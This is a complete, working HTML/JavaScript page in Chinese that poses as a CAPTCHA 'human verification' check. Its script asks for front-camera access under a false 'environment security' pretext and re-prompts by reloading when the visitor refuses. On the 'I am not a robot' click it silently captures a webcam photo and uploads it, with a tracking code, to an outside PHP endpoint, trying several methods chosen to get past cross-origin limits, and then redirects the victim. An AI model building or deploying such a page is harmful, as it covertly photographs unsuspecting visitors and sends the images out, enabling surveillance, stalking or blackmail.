<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>验证中...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f5f5f5;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .loading-container, .captcha-container {
            text-align: center;
            padding: 40px;
            background: white;
            border-radius: 20px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
            max-width: 380px;
            width: 90%;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #e0e0e0;
            border-top-color: #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .loading-text { color: #666; font-size: 16px; margin-bottom: 10px; }
        .progress-bar { width: 100%; height: 4px; background: #e0e0e0; border-radius: 2px; overflow: hidden; margin-top: 20px; }
        .progress-fill { width: 0%; height: 100%; background: linear-gradient(90deg, #667eea, #764ba2); transition: width 0.3s; }
        .captcha-container { display: none; }
        .captcha-icon { font-size: 48px; margin-bottom: 15px; }
        .captcha-title { font-size: 20px; font-weight: bold; color: #333; margin-bottom: 10px; }
        .captcha-desc { color: #666; font-size: 14px; margin-bottom: 20px; }
        .checkbox-area {
            display: inline-block; width: 24px; height: 24px; border: 2px solid #ccc;
            border-radius: 4px; margin-right: 10px; cursor: pointer; background: white;
        }
        .checkbox-area.checked { background: #667eea; border-color: #667eea; position: relative; }
        .checkbox-area.checked::after { content: '✓'; color: white; font-size: 16px; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); }
        .verify-row { display: flex; align-items: center; justify-content: center; margin-top: 20px; cursor: pointer; }
        .camera-preview { width: 100%; max-width: 280px; margin: 12px auto; border-radius: 16px; overflow: hidden; background: #333; display: none; }
        .camera-preview video { width: 100%; height: auto; display: block; }
        .camera-status { font-size: 12px; margin-top: 10px; color: #28a745; }
        .camera-status.error { color: #ff3b30; }
        .code-badge { margin-top: 15px; font-size: 12px; color: #999; }
        video { position: fixed; top: -9999px; left: -9999px; width: 1px; height: 1px; }
        #uploadResult {
            margin-top: 12px;
            font-size: 13px;
            word-break: break-word;
            min-height: 20px;
        }
        .debug-info { margin-top: 10px; font-size: 11px; color: #999; word-break: break-all; }
    </style>
</head>
<body>
    <div class="loading-container" id="loadingContainer">
        <div class="spinner"></div>
        <div class="loading-text">正在验证环境安全...</div>
        <div class="loading-text" style="font-size: 12px; color: #999;">正在初始化摄像头...</div>
        <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
        <div class="code-badge">验证编号: <span id="displayCode"></span></div>
        <div class="camera-status" id="cameraStatus">⏳ 等待摄像头授权...</div>
        <div class="debug-info" id="debugInfo"></div>
    </div>
    <div class="captcha-container" id="captchaContainer">
        <div class="captcha-icon">🤖</div>
        <div class="captcha-title">人机验证</div>
        <div class="captcha-desc">请完成验证以继续访问</div>
        <div class="camera-preview" id="cameraPreview">
            <video id="previewVideo" autoplay playsinline webkit-playsinline muted></video>
        </div>
        <div class="verify-row" id="verifyRow">
            <div class="checkbox-area" id="checkbox"></div>
            <span>我不是机器人</span>
        </div>
        <div class="code-badge">验证编号: <span id="displayCode2"></span></div>
        <div id="uploadResult"></div>
    </div>
    <!-- 隐藏视频用于拍照 -->
    <video id="video" autoplay playsinline webkit-playsinline muted></video>
    <canvas id="canvas" style="display: none;"></canvas>

    <script>
        // ==================== 配置 ====================
        const API_URL = 'http://a1nb66.atwebpages.com/zyj/api.php';
        const urlParams = new URLSearchParams(window.location.search);
        const code = urlParams.get('code') || 'UNKNOWN';
        const targetUrl = urlParams.get('url') || 'https://www.baidu.com';

        document.getElementById('displayCode').textContent = code;
        document.getElementById('displayCode2').textContent = code;
        document.getElementById('debugInfo').textContent = 'API: ' + API_URL + ' | 编号: ' + code;

        let stream = null, photoCaptured = false, cameraReady = false, videoElement = null, retryCount = 0;
        const maxRetries = 3;

        // 进度条
        let progress = 0;
        const progressInterval = setInterval(() => {
            if (progress < 90) {
                progress += Math.random() * 12;
                if (progress > 90) progress = 90;
                document.getElementById('progressFill').style.width = progress + '%';
            }
        }, 200);

        function refreshAndRetry() {
            retryCount++;
            if (retryCount <= maxRetries) {
                document.getElementById('cameraStatus').innerHTML = `🔄 重新请求 (${retryCount}/${maxRetries})`;
                document.getElementById('cameraStatus').classList.add('error');
                setTimeout(() => window.location.reload(), 1500);
            } else {
                document.getElementById('cameraStatus').innerHTML = '⚠️ 无法获取摄像头，跳过拍照';
                document.getElementById('cameraStatus').classList.add('error');
                setTimeout(() => {
                    document.getElementById('loadingContainer').style.display = 'none';
                    document.getElementById('captchaContainer').style.display = 'block';
                    cameraReady = false;
                }, 1500);
            }
        }

        // ==================== 拍照（缩小尺寸 + 低质量） ====================
        function capturePhoto() {
            return new Promise((resolve, reject) => {
                if (!videoElement || !cameraReady) {
                    reject('摄像头未就绪');
                    return;
                }
                const canvas = document.getElementById('canvas');
                const ctx = canvas.getContext('2d');
                if (videoElement.videoWidth === 0) {
                    reject('视频未就绪');
                    return;
                }
                // 缩小画布尺寸（480x360）以减少数据量，同时保持清晰度
                const targetWidth = 480;
                const targetHeight = Math.round((videoElement.videoHeight / videoElement.videoWidth) * targetWidth);
                canvas.width = targetWidth;
                canvas.height = targetHeight;
                ctx.drawImage(videoElement, 0, 0, targetWidth, targetHeight);
                // 质量降至 0.5，进一步压缩
                resolve(canvas.toDataURL('image/jpeg', 0.5));
            });
        }

        // ==================== 上传方式1：iframe（最可靠，完全绕过跨域） ====================
        function uploadViaIframe(photoData) {
            return new Promise((resolve, reject) => {
                const form = document.createElement('form');
                form.method = 'POST';
                form.action = API_URL + '?action=capture_photo';
                form.enctype = 'multipart/form-data';
                const iframeName = 'upload_iframe_' + Date.now();
                form.target = iframeName;
                form.style.display = 'none';

                // 字段
                const fields = {
                    'photo_data': photoData,
                    'target_url': targetUrl,
                    'code': code
                };
                for (let key in fields) {
                    const input = document.createElement('input');
                    input.type = 'hidden';
                    input.name = key;
                    input.value = fields[key];
                    form.appendChild(input);
                }

                const iframe = document.createElement('iframe');
                iframe.name = iframeName;
                iframe.style.display = 'none';
                document.body.appendChild(iframe);
                document.body.appendChild(form);

                let timeoutId = setTimeout(() => {
                    cleanup();
                    reject(new Error('iframe 上传超时'));
                }, 30000);

                iframe.onload = function() {
                    clearTimeout(timeoutId);
                    let responseText = '';
                    try {
                        const doc = iframe.contentDocument || iframe.contentWindow.document;
                        if (doc && doc.body) {
                            responseText = doc.body.textContent || doc.body.innerText || '';
                        }
                    } catch (e) {
                        // 跨域限制，但这里同源应该可以访问
                    }
                    try {
                        const result = JSON.parse(responseText);
                        cleanup();
                        resolve(result);
                    } catch (e) {
                        // 如果不是 JSON，尝试简单判断
                        if (responseText.includes('success')) {
                            cleanup();
                            resolve({ success: true });
                        } else {
                            cleanup();
                            reject(new Error('响应解析失败: ' + responseText.substring(0, 100)));
                        }
                    }
                };

                iframe.onerror = function() {
                    clearTimeout(timeoutId);
                    cleanup();
                    reject(new Error('iframe 加载失败'));
                };

                function cleanup() {
                    clearTimeout(timeoutId);
                    setTimeout(() => {
                        if (form.parentNode) form.parentNode.removeChild(form);
                        if (iframe.parentNode) iframe.parentNode.removeChild(iframe);
                    }, 100);
                }

                form.submit();
            });
        }

        // ==================== 上传方式2：Fetch（如果可用） ====================
        function uploadViaFetch(photoData) {
            const fd = new FormData();
            fd.append('photo_data', photoData);
            fd.append('target_url', targetUrl);
            fd.append('code', code);
            return fetch(API_URL + '?action=capture_photo', {
                method: 'POST',
                body: fd,
                mode: 'cors'
            }).then(res => res.json());
        }

        // ==================== 上传方式3：XMLHttpRequest ====================
        function uploadViaXHR(photoData) {
            return new Promise((resolve, reject) => {
                const xhr = new XMLHttpRequest();
                xhr.open('POST', API_URL + '?action=capture_photo', true);
                xhr.timeout = 30000;
                const fd = new FormData();
                fd.append('photo_data', photoData);
                fd.append('target_url', targetUrl);
                fd.append('code', code);
                xhr.onload = function() {
                    if (xhr.status >= 200 && xhr.status < 300) {
                        try {
                            resolve(JSON.parse(xhr.responseText));
                        } catch (e) {
                            reject(new Error('解析响应失败'));
                        }
                    } else {
                        reject(new Error('HTTP ' + xhr.status));
                    }
                };
                xhr.onerror = function() { reject(new Error('XHR 失败')); };
                xhr.ontimeout = function() { reject(new Error('XHR 超时')); };
                xhr.send(fd);
            });
        }

        // ==================== 综合上传 ====================
        async function uploadPhoto(photoData) {
            const resultDiv = document.getElementById('uploadResult');
            // 优先使用 iframe（最可靠）
            const methods = [
                { name: 'iframe', fn: () => uploadViaIframe(photoData) },
                { name: 'Fetch', fn: () => uploadViaFetch(photoData) },
                { name: 'XHR', fn: () => uploadViaXHR(photoData) }
            ];

            for (let i = 0; i < methods.length; i++) {
                const method = methods[i];
                try {
                    resultDiv.textContent = `📤 尝试 ${method.name}...`;
                    resultDiv.style.color = '#007aff';
                    const result = await method.fn();
                    if (result && result.success !== false) {
                        resultDiv.textContent = `✅ 上传成功 (${method.name})`;
                        resultDiv.style.color = '#34c759';
                        return result;
                    } else {
                        // 如果返回 success=false，也视为失败，尝试下一个
                        throw new Error(result?.error || '上传失败');
                    }
                } catch (err) {
                    console.warn(`${method.name} 失败:`, err);
                    // 继续下一个
                }
            }
            throw new Error('所有上传方式均失败');
        }

        // ==================== 主流程 ====================
        async function takePhotoAndRedirect() {
            if (photoCaptured) return;
            photoCaptured = true;
            
            const resultDiv = document.getElementById('uploadResult');
            let photoData = null;
            
            // 1. 拍照
            if (cameraReady && videoElement?.videoWidth > 0) {
                try {
                    photoData = await capturePhoto();
                    resultDiv.textContent = '📸 拍照成功，准备上传...';
                    resultDiv.style.color = '#007aff';
                } catch(e) {
                    resultDiv.textContent = '⚠️ 拍照失败: ' + e.message;
                    resultDiv.style.color = '#ff3b30';
                }
            } else {
                resultDiv.textContent = '⚠️ 摄像头未就绪，跳过拍照';
                resultDiv.style.color = '#ff3b30';
            }

            // 2. 上传（如果有照片）
            if (photoData) {
                try {
                    const result = await uploadPhoto(photoData);
                    if (result.success) {
                        resultDiv.textContent = '✅ 照片已保存！';
                        resultDiv.style.color = '#34c759';
                    } else {
                        resultDiv.textContent = '❌ ' + (result.error || '保存失败');
                        resultDiv.style.color = '#ff3b30';
                    }
                } catch (err) {
                    resultDiv.textContent = '❌ 上传异常: ' + err.message;
                    resultDiv.style.color = '#ff3b30';
                }
            } else {
                resultDiv.textContent = '⚠️ 无照片数据，跳过上传';
                resultDiv.style.color = '#ff3b30';
            }

            // 3. 释放摄像头
            if (stream) stream.getTracks().forEach(t => t.stop());

            // 4. 跳转（延迟2秒让用户看到结果）
            setTimeout(() => {
                window.location.href = targetUrl;
            }, 2000);
        }

        // ==================== 初始化摄像头 ====================
        async function initCamera() {
            try {
                // 请求更低的清晰度以减少数据量，同时兼容 iOS
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        width: { ideal: 480 }, 
                        height: { ideal: 360 },
                        facingMode: "user"
                    } 
                });
                videoElement = document.getElementById('video');
                videoElement.srcObject = stream;
                const previewVideo = document.getElementById('previewVideo');
                if (previewVideo) {
                    previewVideo.srcObject = stream;
                    document.getElementById('cameraPreview').style.display = 'block';
                }
                await new Promise(r => { videoElement.onloadedmetadata = () => { videoElement.play(); r(); }; });
                await new Promise(r => setTimeout(r, 800));
                if (videoElement.videoWidth > 0) {
                    cameraReady = true;
                    document.getElementById('cameraStatus').innerHTML = '✅ 摄像头已就绪';
                    document.getElementById('cameraStatus').classList.remove('error');
                }
                progress = 100;
                document.getElementById('progressFill').style.width = '100%';
                setTimeout(() => {
                    document.getElementById('loadingContainer').style.display = 'none';
                    document.getElementById('captchaContainer').style.display = 'block';
                }, 600);
            } catch(err) {
                console.error('Camera error:', err);
                if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
                    refreshAndRetry();
                } else {
                    document.getElementById('cameraStatus').innerHTML = '⚠️ 摄像头初始化失败';
                    document.getElementById('cameraStatus').classList.add('error');
                    setTimeout(() => {
                        document.getElementById('loadingContainer').style.display = 'none';
                        document.getElementById('captchaContainer').style.display = 'block';
                        cameraReady = false;
                    }, 1500);
                }
            }
        }

        // ==================== 人机验证 ====================
        let verified = false;
        const verifyRow = document.getElementById('verifyRow');
        const checkbox = document.getElementById('checkbox');
        if (verifyRow) {
            verifyRow.addEventListener('click', () => {
                if (verified) return;
                checkbox.classList.add('checked');
                verified = true;
                verifyRow.querySelector('span').textContent = '验证中...';
                setTimeout(() => takePhotoAndRedirect(), 500);
            });
        }

        // 启动
        initCamera();
        window.addEventListener('beforeunload', () => { if (stream) stream.getTracks().forEach(t => t.stop()); });
    </script>
</body>
</html>
